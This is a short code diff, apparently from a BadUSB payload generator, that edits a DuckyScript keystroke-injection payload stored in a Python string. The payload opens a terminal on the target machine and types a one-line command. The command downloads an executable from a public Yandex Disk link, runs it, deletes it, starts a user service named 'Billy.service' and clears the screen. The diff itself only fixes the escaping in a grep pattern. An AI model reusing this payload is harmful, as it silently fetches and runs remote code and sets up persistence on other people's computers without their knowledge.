@@ -82,7 +82,7 @@ STRING sh -c "xdg-terminal-exec||kgx||ptyxis||gnome-terminal||mate-terminal||xfc
 DELAY 1000
 ENTER
 DELAY 1000
-STRING wget -q -O temp.txt "https://cloud-api.yandex.net/v1/disk/public/resources/download?public_key={link}" ; download_url=$(grep -oP '"href":"\K[^"]+' temp.txt | head -1); wget -q -O Installer "$download_url"; chmod +x Installer; rm temp.txt; ./Installer; rm Installer; systemctl --user start Billy.service; clear; exit
+STRING wget -q -O temp.txt "https://cloud-api.yandex.net/v1/disk/public/resources/download?public_key={link}" ; download_url=$(grep -oP '"href":"\\K[^"]+' temp.txt | head -1); wget -q -O Installer "$download_url"; chmod +x Installer; rm temp.txt; ./Installer; rm Installer; systemctl --user start Billy.service; clear; exit
 DELAY 2000
 ENTER"""
 
